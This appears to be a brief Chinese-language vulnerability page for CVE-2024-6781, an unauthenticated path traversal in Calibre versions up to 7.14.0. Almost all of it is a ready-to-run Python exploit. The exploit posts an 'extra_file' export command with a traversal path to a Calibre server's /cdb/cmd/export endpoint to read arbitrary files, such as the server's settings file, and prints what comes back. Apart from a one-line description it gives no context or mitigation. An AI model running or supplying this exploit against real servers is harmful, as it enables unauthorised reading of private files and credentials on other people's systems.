# Calibre任意文件读取漏洞(CVE-2024-6781)

Calibre <= 7.14.0 中的路径遍历允许未经身份验证的攻击者实现任意文件读取。

## poc

```python
#! /usr/bin/env python3
# Ldwk
# PoC for: CVE-2024-6781
import json
import sys

import requests

_target = "http://localhost:8080" # SET ME
_book_id = 1 # ensure book_id exists

def exploit(path):
    r = requests.post(
        f"{_target}/cdb/cmd/export",
        headers={"Content-Type": "application/json"},
        json=["extra_file", _book_id, path, ""],
    )
    try:
        print(r.json()["result"])
    except Exception:
        print(r.text)

if __name__ == "__main__":
    exploit("..\\..\\..\\Calibre Settings\\gui.json")

```

